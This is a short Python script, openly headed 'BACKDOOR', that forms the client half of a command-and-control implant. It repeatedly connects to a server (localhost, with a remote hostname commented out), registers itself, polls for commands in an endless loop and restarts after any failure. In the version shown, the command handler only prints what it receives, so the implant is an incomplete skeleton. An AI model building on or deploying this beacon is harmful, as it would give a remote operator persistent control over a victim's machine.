import socket
import os
import time
from function import *

print("--------------------------------------")
print("                BACKDOOR              ")
print("--------------------------------------")

ipServeur = 'localhost'
portServeur = 45
#ipServeur = 'ip.ghmail.fr' 
#portServeur = 500

def start():
    connexion_serveur = connexion()
    if connexion_serveur == None:
        return False, None
    msgSend('startBackdoor', connexion_serveur)
    id = msgRecv(connexion_serveur)
    connexion_serveur.close()
    return True, id


def main(id):
    connexion_serveur = connexion()
    if connexion_serveur == None:
        return None
    msgSend('updateBackdoor',connexion_serveur)
    msgRecv(connexion_serveur)
    msgSend(str(id),connexion_serveur)
    reponse = msgRecv(connexion_serveur)
    connexion_serveur.close()
    if reponse != 'none':
        executeCommande(reponse, connexion_serveur)
    
    return True


def executeCommande(commande,connexion_serveur):
    print("recu commande : "+str(commande))

    
def connexion(s=0):
    try:
        connexion_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connexion_serveur.connect((ipServeur, portServeur))
        return connexion_serveur
    except:
        s += 1
        if s < 4:
            print("Erreur de connection au serveur")
            print("Nouvelle tentative")
            print('')
            return connexion(s)
        else:
            return None


while True:
    try:
        startOk, id = start()
        if startOk != False: 
            while True:
                mainOk = main(id)
                if mainOk == None:
                    break
        else:
            print("Retour false au Start")
            time.sleep(10)
    except:
        print("Erreur critique redemarrage complet")
        time.sleep(10)

